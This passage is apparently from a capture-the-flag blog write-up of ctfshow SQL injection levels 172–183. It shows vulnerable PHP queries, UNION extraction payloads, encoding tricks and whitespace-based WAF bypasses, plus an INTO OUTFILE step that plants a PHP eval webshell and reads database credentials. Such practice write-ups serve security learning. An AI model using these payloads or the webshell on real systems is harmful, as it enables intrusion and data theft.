src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.4.jpg" class=""></li></ol><h1>172</h1><h2 id="题目-2">题目</h2><p>查询语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user2 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//检查结果是否有flag</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-symbol">$row</span>-&gt;username!==<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>      <span class="hljs-symbol">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>返回结果过滤了含”flag“的记录</p><h2 id="解法1-2">解法1</h2><p>payload</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> id,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user2 <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;flag</span><br></code></pre></td></tr></table></figure><p>不返回用户名”flag“</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/2.1.jpg" class=""><h2 id="解法2-2">解法2</h2><p>使用base64或者hex编码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> to_base64(username),to_base64(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> ctfshow_user2 --+<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> hex(username),hex(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> ctfshow_user2 --+<br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/2.2.jpg" class=""><h1>173</h1><p>与172类似</p><p>查询语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//检查结果是否有flag</span><br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, json_encode(<span class="hljs-symbol">$ret</span>)))&#123;<br>      <span class="hljs-symbol">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br>      <br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">-1</span>&#x27; union select <span class="hljs-built_in">id</span>,hex(username),hex(password) <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/3.2.jpg" class=""><p>在线hex解码</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/3.1.jpg" class=""><h1>174</h1><p>replace用法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-string">&quot;要替换的字符串&quot;</span>,<span class="hljs-string">&quot;想要替换的字符&quot;</span>,<span class="hljs-string">&quot;替换成的字符&quot;</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)</span></span>---&gt;<span class="hljs-number">1</span>bc<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">replace(<span class="hljs-keyword">password</span>,&quot;1&quot;,&quot;!&quot;)<br>replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(<span class="hljs-keyword">password</span>,&quot;0&quot;,&quot;)&quot;),&quot;9&quot;,&quot;(&quot;),&quot;8&quot;,&quot;*&quot;),&quot;7&quot;,&quot;&amp;&quot;),&quot;6&quot;,&quot;^&quot;),&quot;5&quot;,&quot;%&quot;),&quot;4&quot;,&quot;$&quot;),&quot;3&quot;,&quot;#&quot;),&quot;2&quot;,&quot;@&quot;),&quot;1&quot;,&quot;!&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-keyword">password</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;)&quot;</span>),<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;(&quot;</span>),<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>),<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;&amp;&quot;</span>),<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;^&quot;</span>),<span class="hljs-string">&quot;5&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>),<span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;$&quot;</span>),<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;#&quot;</span>),<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;@&quot;</span>),<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>) <span class="hljs-keyword">from</span> ctfshow_user4 <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;flag&#x27;</span> --+<br></code></pre></td></tr></table></figure><h1>175</h1><p>查询语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user5 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure><p>返回逻辑：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//检查结果是否有flag</span><br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[\x00-\x7f]/i&#x27;</span>, json_encode(<span class="hljs-symbol">$ret</span>)))&#123;<br>      <span class="hljs-symbol">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>解题过程：</p><ol><li>通过写入文件的方式</li></ol><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">99&#x27; union select 1,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; into outfile &#x27;/var/www/html/1.php&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>将命令进行base64编码</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.1.jpg" class=""></li><li><p>再进行url编码</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.2.jpg" class=""></li><li><p>payload</p></li></ol><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-number">99</span>&#x27; union select <span class="hljs-number">1</span>,from_base64(&quot;<span class="hljs-variable">%50%</span><span class="hljs-number">44</span><span class="hljs-variable">%39%</span><span class="hljs-number">77</span><span class="hljs-variable">%61%</span><span class="hljs-number">48</span><span class="hljs-variable">%41%</span><span class="hljs-number">67</span><span class="hljs-variable">%5a%</span><span class="hljs-number">58</span><span class="hljs-variable">%5a%</span><span class="hljs-number">68</span><span class="hljs-variable">%62%</span><span class="hljs-number">43</span><span class="hljs-variable">%67%</span><span class="hljs-number">6</span>b<span class="hljs-variable">%58%</span><span class="hljs-number">31</span><span class="hljs-variable">%42%</span><span class="hljs-number">50</span><span class="hljs-variable">%55%</span><span class="hljs-number">31</span><span class="hljs-variable">%52%</span><span class="hljs-number">62</span><span class="hljs-variable">%4d%</span><span class="hljs-number">56</span><span class="hljs-variable">%30%</span><span class="hljs-number">70</span><span class="hljs-variable">%4f%</span><span class="hljs-number">7</span>a<span class="hljs-variable">%38%</span><span class="hljs-number">2</span>b&quot;) into outfile &#x27;/var/www/html/<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><p>（注意最后不闭合）</p><ol start="5"><li><p>抓包重放，发现payload完整，未被截断，响应无有用信息，无法判断是否成功写入文件</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.3.jpg" class=""></li><li><p>尝试：通过url访问，查看php文件是否写入server</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.4.jpg" class=""><p>已经成功写入文件</p></li><li><p>利用hackercar尝试执行命令phpinfo()→成功</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.5.jpg" class=""></li><li><p>接着获取密码</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.12.jpg" class=""><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.13.jpg" class=""><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.14.jpg" class=""></li><li><p>使用蚁剑获取数据库信息</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.6.jpg" class=""><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.7.jpg" class=""><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.8.jpg" class=""><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.9.jpg" class=""><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.10.jpg" class=""></li></ol><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.11.jpg" class=""><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.15.jpg" class=""><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.16.jpg" class=""><p>获取密码：</p><p>查看目录</p><p>查看api文件夹目录</p><p>读入config.php</p><p>测试连接，添加</p><h1>176</h1><p>查询语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure><p>返回逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//对传入的参数进行了过滤</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>   <span class="hljs-comment">//代码过于简单，不宜展示</span><br>  &#125;<br>     <br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/6.1.jpg" class=""><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/6.2.jpg" class=""><h1>177 /**/</h1><p>使用176相同的payload，发现不可以，则应该是进行了更严格的过滤</p><p>尝试：</p><p>使用模糊查询→不行</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-number">-1</span>&#x27; or username like <span class="hljs-string">&quot;%flag%&quot;</span><br></code></pre></td></tr></table></figure><p>常规联合查询→不行</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,&#x27;<span class="hljs-number">3</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>猜测过滤了空格，方法：用注释代替空格→成功</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27;<span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.17.jpg" class=""><p>查询：（可以用反引号`代替空格？）</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">password</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>ctfshow_user<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>username=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">3</span>;%23<br></code></pre></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">password</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>ctfshow_user<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>username=<span class="hljs-string">&#x27;flag&#x27;</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/6.3.jpg" class=""><p>或者使用换行：%0b</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">-1&#x27;u</span>nion%<span class="hljs-number">0b</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>password<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>ctfshow_user<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>username=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">3</span>;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h1>178 %09</h1><p><code>查ascii的Hex列，尝试用其他符号替换空格</code>：<a href="https://baike.baidu.com/item/ASCII/309296">ASCII_百度百科 (baidu.com)</a></p><p>过滤：过滤了空格</p><p>绕过：用%09</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27;union<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%091</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%09</span>password<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>ctfshow_user<span class="hljs-variable">%09</span>where<span class="hljs-variable">%09</span>username<span class="hljs-operator">=</span>&#x27;flag&#x27;)<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-comment">;%23</span><br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/8.1.jpg" class=""><h1>179 %0c</h1><p><strong>解法一</strong></p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;or</span><span class="hljs-symbol">&#x27;1</span><span class="hljs-symbol">&#x27;=</span><span class="hljs-symbol">&#x27;1</span><span class="hljs-symbol">&#x27;%23</span><br></code></pre></td></tr></table></figure><p><strong>解法二</strong></p><p>使用%0c代替空格</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">-<span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%0cunion%</span><span class="hljs-number">0</span>cselect&#x27;<span class="hljs-number">1</span>&#x27;,(select`password`from`ctfshow_user`where`username=&#x27;flag&#x27;),&#x27;<span class="hljs-number">3</span>&#x27;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h1>180</h1><p><strong>解法一</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span>cusername<span class="hljs-operator">=</span>&#x27;flag<br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/10.1.jpg" class=""><p><strong>解法二</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27;or(id=<span class="hljs-number">26</span>)and&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-number">-1</span><span class="hljs-symbol">&#x27;%0cor%0c</span><span class="hljs-symbol">&#x27;1</span><span class="hljs-symbol">&#x27;=</span><span class="hljs-symbol">&#x27;1</span><br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/10.2.jpg" class=""><h1>181</h1><p><strong>题目</strong></p><p>查询语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//对传入的参数进行了过滤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br></code></pre></td></tr></table></figure><p><strong>解法一</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span>cusername<span class="hljs-operator">=</span>&#x27;flag<br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/11.1.jpg" class=""><p><strong>解法二</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27;or(id=<span class="hljs-number">26</span>)and&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1>182 模糊匹配</h1><p><strong>题目</strong></p><p>返回逻辑</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//对传入的参数进行了过滤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select</span>|<span class="hljs-string">flag/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">      </span><br></code></pre></td></tr></table></figure><p><strong>解法一</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27; <span class="hljs-keyword">or</span> username like <span class="hljs-variable">%fla</span>%<br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span>cusername<span class="hljs-variable">%0</span>clike&#x27;<span class="hljs-variable">%fla</span>%<br></code></pre></td></tr></table></figure><p><strong>解法二</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-<span class="hljs-number">1</span>&#x27;or(id=26)and&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1>183</h1><p><strong>题目</strong></p><p>查询语句：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>拼接sql语句查找指定ID用户<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(pass) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>返回逻辑：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>拼接sql语句查找指定ID用户<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(pass) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>解法一</strong></p><p>可以传参，使用hackerbar尝试：</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.1.jpg" class=""><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.2.jpg" class=""><p>不能用flag，因为flag格式是tf开头的？</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">tableName=`ctfshow_user`<span class="hljs-keyword">where</span>`pass`lik<span class="hljs-string">e&#x27;%c%&#x27;</span><br></code></pre></td></tr></table></figure><p>对%进行url编码：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">tableName=`ctfshow_user`<span class="hljs-keyword">where</span>`pass`lik<span class="hljs-string">e&#x27;%25c%25&#x27;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.3.jpg" class=""><p>有一条记录，说明这条语句执行成功</p><p>返回的是真/假，可以逐个匹配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://18f37b19-2326-4077-a901-e980f273b362.challenge.ctf.show/select-waf.php&#x27;</span><br><br>flag_str = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm&#123;&#125;-1234567890&#x27;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">47</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flag_str:<br>        data = &#123;<br>            <span 